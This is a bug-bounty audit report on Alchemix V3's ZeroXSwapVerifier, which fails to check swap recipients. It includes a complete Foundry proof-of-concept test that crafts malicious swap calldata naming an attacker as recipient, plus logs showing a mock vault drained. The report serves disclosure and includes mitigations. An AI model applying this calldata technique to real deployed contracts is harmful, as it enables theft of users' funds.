# 58666 sc low recipient owner not enforced in action verifiers enables theft of swap proceeds

**Submitted on Nov 3rd 2025 at 23:02:56 UTC by @Johnyfwesh for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58666
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Finding Description and Impact

`ZeroXSwapVerifier.decodeAndVerifyActions()` never validates the `SlippageAndActions.recipient` or the propagated `owner` field, so downstream action verifiers accept calldata that forwards swap proceeds to arbitrary recipients. In both verifier entry points, `_verifyExecuteCalldata` and `_verifyExecuteMetaTxnCalldata`, the struct is decoded and the code immediately relays `saa.actions` to `_verifyActions` without checking `saa.recipient` ([`src/utils/ZeroXSwapVerifier.sol:125-143`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/utils/ZeroXSwapVerifier.sol#L125-L143)). Inside the action dispatch, neither `_verifyBasicSellToPool`, `_verifyUniswapV3VIP`, nor `_verifyTransferFrom` inspect the decoded recipient; `_verifyTransferFrom` even ignores the `from`/`to` parameters entirely ([`src/utils/ZeroXSwapVerifier.sol:163-246`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/utils/ZeroXSwapVerifier.sol#L163-L246)).

Integrations such as the allocator pipeline inherit the verifier’s result as a hard precondition before calling the 0x settler ([`src/AlchemistAllocator.sol`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/AlchemistAllocator.sol)). Because the library returns `true` for any calldata that satisfies token and slippage checks, an attacker can craft a bundle where `SlippageAndActions.recipient` (or a per-action recipient) is the attacker’s address, while keeping the sell token and BPS within bounds. The malicious calldata passes `verifySwapCalldata`, allowing the privileged caller to forward the payload to the 0x settler, which then executes transfers that siphon proceeds to the attacker instead of the intended owner.

### Affected code

* [`src/utils/ZeroXSwapVerifier.sol:125-143`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/utils/ZeroXSwapVerifier.sol#L125-L143)
* [`src/utils/ZeroXSwapVerifier.sol:188-246`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/utils/ZeroXSwapVerifier.sol#L188-L246)
* [`src/AlchemistAllocator.sol`](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/AlchemistAllocator.sol)

```solidity
// src/utils/ZeroXSwapVerifier.sol#L125-L143
(SlippageAndActions memory saa, ) = abi.decode(data, (SlippageAndActions, bytes));
_verifyActions(saa.actions, owner, targetToken, maxSlippageBps);

// src/utils/ZeroXSwapVerifier.sol#L238-L245
(address token, , , uint256 amount) = abi.decode(
    _slice(action, 4),
    (address, address, address, uint256)
);
require(token == targetToken, "IT");
```

***

## Impact

### Swap proceeds can be rerouted

* An attacker supplies quotes where `SlippageAndActions.recipient` (or the Uniswap VIP recipient) is the attacker.
* `verifySwapCalldata` returns `true`, so orchestrators trust the calldata and forward it to the 0x settler.
* During settlement, proceeds are transferred to the attacker’s address, resulting in direct fund theft with no on-chain validation preventing it.

### Owner/recipient spoofing breaks accounting

* Integrators that assume the verifier enforces the owner or recipient can account rewards or balances to the wrong party.
* Because `_verifyTransferFrom` ignores both `from` and `to`, an attacker can pull assets from any approved address while `verifySwapCalldata` still succeeds, bypassing intended recipient controls.

***

## Recommended mitigation steps

1. Explicitly validate `saa.recipient` against the expected `owner` (or a caller-provided allowlist) before delegating to `_verifyActions`.
2. Within each action verifier, enforce that decoded recipient/output addresses match `saa.recipient` (or the caller’s supplied target) and that `owner` is respected for source addresses.
3. Reject any action that omits or mismatches the enforced addresses, and extend tests to cover each action type to prevent regressions.

***

## Proof of Concept

## PoC Test `testRecipientCanStealSwapProceeds` That will Run in (`src/test/Poc.t.sol`)

### Exploit Sequence

1. Deploy a victim executor that calls `ZeroXSwapVerifier.verifySwapCalldata` before delegating swaps to a 0x settler.
2. Mint vault tokens, transfer them to the executor, and craft swap calldata whose `SlippageAndActions.recipient` is the attacker.
3. The verifier returns `true` because slippage and token filters pass, so the executor approves the settler and forwards the call.
4. The mock settler executes `transferFrom` using the malicious recipient, draining the vault while the legitimate owner receives nothing.

The test demonstrates the theft and logs the balance changes: Add this test file in the src/test folder

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
import {TestERC20} from "./mocks/TestERC20.sol";

interface IMockZeroXSettler {
    function execute(ZeroXSwapVerifier.SlippageAndActions calldata saa, bytes[] calldata fills) external;
}

/**
 * @dev Minimal mock of the 0x Settler that follows transfer instructions from actions.
 * It only supports the TRANSFER_FROM action to keep the PoC focused.
 */
contract MockZeroXSettler is IMockZeroXSettler {
    IERC20 public immutable token;

    bytes4 private constant TRANSFER_FROM = 0x8d68a156;

    constructor(IERC20 _token) {
        token = _token;
    }

    function execute(ZeroXSwapVerifier.SlippageAndActions calldata saa, bytes[] calldata) external override {
        console.log("Settler actions length", saa.actions.length);
        for (uint256 i = 0; i < saa.actions.length; i++) {
            bytes calldata rawAction = saa.actions[i];
            bytes memory action = rawAction;
            bytes32 firstWord;
            assembly {
                firstWord := mload(add(action, 32))
            }
            bytes4 selector = bytes4(firstWord);

            bytes memory params = new bytes(action.length - 4);
            for (uint256 j = 0; j < params.length; j++) {
                params[j] = action[j + 4];
            }

            (address tokenAddr, address from, address to, uint256 amount) =
                abi.decode(params, (address, address, address, uint256));

            console.logBytes4(selector);
            console.log("Action token", tokenAddr);
            console.log("Action from", from);
            console.log("Action to", to);
            console.log("Action amount", amount);

            if (selector != TRANSFER_FROM) revert("unsupported action");
            require(tokenAddr == address(token), "unexpected token");

            console.log("Settler allowance", TestERC20(address(token)).allowance(from, address(this)));
            console.log("Settler from balance", token.balanceOf(from));
            console.log("Settler transfer target", amount);

            bool ok = token.transferFrom(from, to, amount);
            require(ok, "transferFrom failed");
        }
    }
}

/**
 * @dev Contract that mirrors how production code would integrate ZeroXSwapVerifier
 * before calling into the Settler. Because the verifier ignores the recipient,
 * malicious calldata can drain this vault.
 */
contract GuardedExecutor {
    IERC20 public immutable token;
    address public immutable owner;
    IMockZeroXSettler public immutable settler;

    uint256 public constant MAX_SLIPPAGE_BPS = 1_000;

    constructor(IERC20 _token, address _owner, IMockZeroXSettler _settler) {
        token = _token;
        owner = _owner;
        settler = _settler;
    }

    function executeSwap(bytes calldata swapCalldata, uint256 amount) external {
        require(
            ZeroXSwapVerifier.verifySwapCalldata(swapCalldata, owner, address(token), MAX_SLIPPAGE_BPS),
            "verification failed"
        );

        token.approve(address(settler), amount);

        (ZeroXSwapVerifier.SlippageAndActions memory saa, bytes[] memory fills) =
            abi.decode(swapCalldata[4:], (ZeroXSwapVerifier.SlippageAndActions, bytes[]));

        settler.execute(saa, fills);
    }
}

contract RecipientHijackPocTest is Test {
    bytes4 private constant EXECUTE_SELECTOR = 0xcf71ff4f;
    bytes4 private constant TRANSFER_FROM = 0x8d68a156;

    function testRecipientCanStealSwapProceeds() public {
        // 1. Bootstrap the scenario with a funded vault and mock 0x components.
        address legitimateOwner = address(0xA11CE);
        address attacker = address(0xBEEF);
        uint256 sellAmount = 50e18;

        vm.label(legitimateOwner, "LegitimateOwner");
        vm.label(attacker, "Attacker");

        TestERC20 token = new TestERC20(1_000e18, 18);
        MockZeroXSettler settler = new MockZeroXSettler(IERC20(address(token)));
        GuardedExecutor victimVault =
            new GuardedExecutor(IERC20(address(token)), legitimateOwner, IMockZeroXSettler(address(settler)));

        vm.label(address(settler), "MockZeroXSettler");
        vm.label(address(victimVault), "VictimVault");

        token.transfer(address(victimVault), sellAmount);

        console.log("Victim balance before swap", token.balanceOf(address(victimVault)));
        console.log("Owner balance before swap", token.balanceOf(legitimateOwner));
        console.log("Attacker balance before swap", token.balanceOf(attacker));

        // 2. Craft malicious calldata that points SlippageAndActions.recipient to the attacker
        //    and instructs the settler to transfer the vault's tokens to the same attacker.
        bytes memory transferAction = abi.encodeWithSelector(
            TRANSFER_FROM,
            address(token),
            address(victimVault),
            attacker,
            sellAmount
        );

        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: attacker,
            buyToken: address(token),
            minAmountOut: sellAmount,
            actions: new bytes[](1)
        });
        saa.actions[0] = transferAction;

        bytes memory swapCalldata = abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));

        bool passesVerification =
            ZeroXSwapVerifier.verifySwapCalldata(swapCalldata, legitimateOwner, address(token), 1_000);
        console.log("Library verification result", passesVerification);

        // 3. Execute the swap through the guarded vault; verification succeeds, so execution proceeds.
        victimVault.executeSwap(swapCalldata, sellAmount);

        // 4. Observe that the attacker captures the proceeds while the legitimate owner receives nothing.
        console.log("Victim balance after swap", token.balanceOf(address(victimVault)));
        console.log("Owner balance after swap", token.balanceOf(legitimateOwner));
        console.log("Attacker balance after swap", token.balanceOf(attacker));

        assertEq(token.balanceOf(attacker), sellAmount, "attacker should seize all swap proceeds");
        assertEq(token.balanceOf(legitimateOwner), 0, "legitimate owner receives nothing");
        assertEq(token.balanceOf(address(victimVault)), 0, "vault tokens drained");
    }
}

```

```bash
forge test --match-test testRecipientCanStealSwapProceeds
```

Result (`src/test/Poc.t.sol:101`):

```bash
Ran 1 test for src/test/Poc.t.sol:RecipientHijackPocTest
[PASS] testRecipientCanStealSwapProceeds() (gas: 2116590)
Logs:
  Victim balance before swap 50000000000000000000
  Owner balance before swap 0
  Attacker balance before swap 0
  Library verification result true
  Settler actions length 1
  0x8d68a156
  Action token 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  Action from 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
  Action to 0x000000000000000000000000000000000000bEEF
  Action amount 50000000000000000000
  Settler allowance 50000000000000000000
  Settler from balance 50000000000000000000
  Settler transfer target 50000000000000000000
  Victim balance after swap 0
  Owner balance after swap 0
  Attacker balance after swap 50000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 14.04ms (12.89ms CPU time)
```
